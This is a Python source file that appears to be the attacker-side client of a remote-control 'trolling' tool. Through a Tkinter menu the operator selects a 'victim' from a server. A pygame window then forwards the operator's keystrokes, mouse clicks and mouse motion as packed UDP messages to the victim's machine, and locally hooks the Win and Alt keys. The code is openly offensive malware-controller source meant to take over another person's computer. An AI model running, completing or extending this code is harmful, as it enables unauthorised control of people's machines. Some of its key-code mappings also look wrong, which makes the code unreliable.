import socket
import time
from tkinter import *
import keyboard
import pygame
from pygame.locals import *
from tkinter import messagebox

are_down = []


class SocketData:
    s: socket.socket = None
    ip_of_server: tuple = ()
    ip_of_victim: tuple = ()
    want_to_leave: bool = False
    is_in_Tkinter: bool = True  # true in tkinter false in pygame


class TkInterScreen:
    def __init__(self):
        self.root = None
        self.choice = None
        self.options = ['whom to troll: ']
        self.menu = None
        self.start_trolling = None

    def reset_values(self):
        self.root.destroy()
        self.root = None
        self.choice = None
        self.options = None
        self.menu = None
        self.start_trolling = None

    def on_closing(self) -> None:
        SocketData.s.sendto("attacker exit".encode(), SocketData.ip_of_server)
        self.reset_values()
        SocketData.want_to_leave = True

    def send_choice(self) -> None:
        if self.choice.get() != "whom to troll: ":
            SocketData.s.sendto(f"choice{int(self.choice.get()[0]) - 1}".encode(), SocketData.ip_of_server)
            while not SocketData.ip_of_victim:
                pass
            self.reset_values()

        else:
            messagebox.showerror("No selection error", "Choose First")

    def main_loop(self) -> None:
        self.root = Tk()
        self.root.title("Ewwww GUI")
        self.root.configure(bg="#1b1b38")
        self.root.geometry("400x400")
        self.root.iconbitmap('icon.ico')
        self.choice = StringVar()
        self.choice.set("whom to troll: ")
        self.options = ['whom to troll: ']
        self.menu = OptionMenu(self.root, self.choice, *self.options)
        self.menu.config(bg="#544580", activebackground="#544580", borderwidth=2)
        self.menu["highlightthickness"] = 0
        self.menu.pack()
        self.start_trolling = Button(self.root, text="start", command=self.send_choice, height=3, width=12,
                                     bg="#544580",
                                     activebackground="#7461ad")
        self.start_trolling.place(x=150, y=100)

        self.root.protocol("WM_DELETE_WINDOW", self.on_closing)
        self.root.mainloop()

    def update_options(self, to_add: str) -> None:
        if self.options.__contains__('whom to troll: '):
            self.options.remove('whom to troll: ')
        self.options.append(to_add)
        self.menu.destroy()
        self.menu = OptionMenu(self.root, self.choice, *self.options)
        self.menu.config(bg="#544580", activebackground="#544580", borderwidth=2)
        self.menu["highlightthickness"] = 0
        self.menu.pack()


class PygameScreen:
    def __init__(self):
        pygame.init()
        self.screen = None
        self.is_pygame_screen_in_focus = False

    def run(self) -> None:
        self.is_pygame_screen_in_focus = False
        self.screen = pygame.display.set_mode((400, 400), RESIZABLE)
        while 1:
            last_sent_mouse_id = 0
            for event in pygame.event.get():
                match event.type:
                    case pygame.QUIT:
                        SocketData.ip_of_victim = ()
                        pygame.quit()
                        if self.is_pygame_screen_in_focus:
                            unhook_keys()
                        return
                    case pygame.ACTIVEEVENT:
                        if bool(int(event.gain)):
                            if not self.is_pygame_screen_in_focus:
                                hook_keys()
                                self.is_pygame_screen_in_focus = True
                        elif self.is_pygame_screen_in_focus:
                            unhook_keys()
                            self.is_pygame_screen_in_focus = False
                    case pygame.KEYDOWN:
                        if str(event.key) not in are_down:
                            are_down.append(str(event.key))
                            pack_and_send(to_pack=get_virtual_code_of_event(event) * 4)
                    case pygame.KEYUP:
                        if str(event.key) in are_down:
                            are_down.remove(str(event.key))
                            print(event.key)
                            pack_and_send(to_pack=get_virtual_code_of_event(event) * 4 + 2)
                    case pygame.MOUSEBUTTONDOWN:
                        pack_and_send(generate_number_to_represent_mouse_event(event))
                    case pygame.MOUSEBUTTONUP:
                        generated_number = generate_number_to_represent_mouse_event(event)
                        if generated_number not in [0, 1, 17]:  # defined and not scroll
                            pack_and_send(to_pack=generated_number + 16)  # turn the 5th byte on
                    case pygame.MOUSEMOTION:
                        # 7 bits y 7 bits x 1 bit motion flag 1 bit mouse flag
                        current_mouse_id = 100 * pygame.mouse.get_pos()[1] // self.screen.get_size()[1] * 2 ** 9 \
                                           + 100 * pygame.mouse.get_pos()[0] // self.screen.get_size()[0] * 2 ** 2 + 3
                        if current_mouse_id != last_sent_mouse_id:
                            pack_and_send(current_mouse_id)
                            last_sent_mouse_id = current_mouse_id
                            time.sleep(0.05)


def pack_and_send(to_pack: int) -> None:
    if to_pack:
        packed = to_pack.to_bytes(4, 'little')
        SocketData.s.sendto(packed, SocketData.ip_of_victim)


def hook_keys() -> None:
    keyboard.hook_key(key='win', callback=win_pressed, suppress=True)
    keyboard.hook_key(key='alt', callback=alt_pressed, suppress=True)


def unhook_keys() -> None:
    keyboard.unblock_key('alt')
    keyboard.unblock_key('win')


def generate_number_to_represent_mouse_event(event) -> int:
    match event.button:
        # XX01
        case 1:  # left click
            return 5  # 01 01
        case 2:  # middle click
            return 13  # 11 01
        case 3:  # right click
            return 9  # 10 01
        case 4:  # scroll up
            return 17  # 1 00 01
        case 5:  # scroll down
            return 1  # 00 01
        case _:
            return False


def get_virtual_code_of_event(event) -> int:  # return statements are virtual codes
    match event.key:
        case pygame.K_0:
            return 0x30
        case pygame.K_1:
            return 0x31
        case pygame.K_2:
            return 0x32
        case pygame.K_3:
            return 0x33
        case pygame.K_4:
            return 0x34
        case pygame.K_5:
            return 0x35
        case pygame.K_6:
            return 0x36
        case pygame.K_7:
            return 0x37
        case pygame.K_8:
            return 0x38
        case pygame.K_9:
            return 0x39
        case pygame.K_ESCAPE:
            return 0x1b
        case pygame.K_MINUS:
            return 0xbd
        case pygame.K_EQUALS:
            return 0xBB
        case pygame.K_BACKSPACE:
            return 0x08
        case pygame.K_BACKQUOTE:
            return 0xC0
        case pygame.K_F1:
            return 0x70
        case pygame.K_F2:
            return 0x71
        case pygame.K_F3:
            return 0x72
        case pygame.K_F4:
            return 0x73
        case pygame.K_F5:
            return 0x74
        case pygame.K_F6:
            return 0x75
        case pygame.K_F7:
            return 0x76
        case pygame.K_F8:
            return 0x77
        case pygame.K_F9:
            return 0x78
        case pygame.K_F10:
            return 0x79
        case pygame.K_F11:
            return 0x7a
        case pygame.K_F12:
            return 0x7b
        case pygame.K_PRINTSCREEN:
            return 0x2c
        case pygame.K_INSERT:
            return 0x2d
        case pygame.K_DELETE:
            return 0x2e
        case pygame.K_SCROLLOCK:
            return 0x91
        case pygame.K_PAGEUP:
            return 0x21
        case pygame.K_PAGEDOWN:
            return 0x22
        case pygame.K_HOME:
            return 0x24
        case pygame.K_END:
            return 0x23
        case pygame.K_BACKSLASH:
            return 0xdc
        case pygame.K_PAUSE:
            return 0x13
        case pygame.K_TAB:
            return 0x09
        case pygame.K_q:
            return 0x051
        case pygame.K_w:
            return 0xe7
        case pygame.K_e:
            return 0x45
        case pygame.K_r:
            return 0x52
        case pygame.K_t:
            return 0x54
        case pygame.K_y:
            return 0x59
        case pygame.K_u:
            return 0x55
        case pygame.K_i:
            return 0x49
        case pygame.K_o:
            return 0x4f
        case pygame.K_p:
            return 0x50
        case pygame.K_LEFTBRACKET:
            return 0xdb
        case pygame.K_RIGHTBRACKET:
            return 0xdd
        case pygame.K_CAPSLOCK:
            return 0x14
        case pygame.K_a:
            return 0x41
        case pygame.K_s:
            return 0x53
        case pygame.K_d:
            return 0x44
        case pygame.K_f:
            return 0x46
        case pygame.K_g:
            return 0x47
        case pygame.K_h:
            return 0x48
        case pygame.K_j:
            return 0x4a
        case pygame.K_k:
            return 0x4b
        case pygame.K_l:
            return 0x4c
        case pygame.K_SEMICOLON:
            return 0xba
        case pygame.K_QUOTE:
            return 0xde
        case pygame.K_RETURN:
            return 0x0d
        case pygame.K_LSHIFT:
            return 0xa0
        case pygame.K_z:
            return 0x5a
        case pygame.K_x:
            return 0x58
        case pygame.K_c:
            return 0x43
        case pygame.K_v:
            return 0x56
        case pygame.K_b:
            return 0x42
        case pygame.K_n:
            return 0x4e
        case pygame.K_m:
            return 0x4d
        case pygame.K_COMMA:
            return 0xbc
        case pygame.K_PERIOD:
            return 0xbe
        case pygame.K_SLASH:
            return 0xbf
        case pygame.K_RSHIFT:
            return 0xa1
        case pygame.K_LCTRL:
            return 0xa2
        case pygame.K_SPACE:
            return 0x20
        case pygame.K_RCTRL:
            return 0xa3
        case pygame.K_LEFT:
            return 0x25
        case pygame.K_UP:
            return 0x26
        case pygame.K_DOWN:
            return 0x28
        case pygame.K_RIGHT:
            return 0x27
        case _:
            return False


def win_pressed(event: pygame.event) -> None:
    if event.event_type == 'down' and event.name not in are_down:
        pack_and_send(to_pack=364)
        are_down.append(event.name)
    elif event.name in are_down and event.event_type == 'up':
        pack_and_send(to_pack=364 + 2)
        are_down.remove(event.name)


def alt_pressed(event: pygame.event) -> None:
    if event.event_type == 'down' and event.name not in are_down:
        pack_and_send(to_pack=0x12 * 4)
        are_down.append(event.name)
    elif event.name in are_down and event.event_type == 'up':
        pack_and_send(to_pack=0x12 * 4 + 2)
        are_down.remove(event.name)
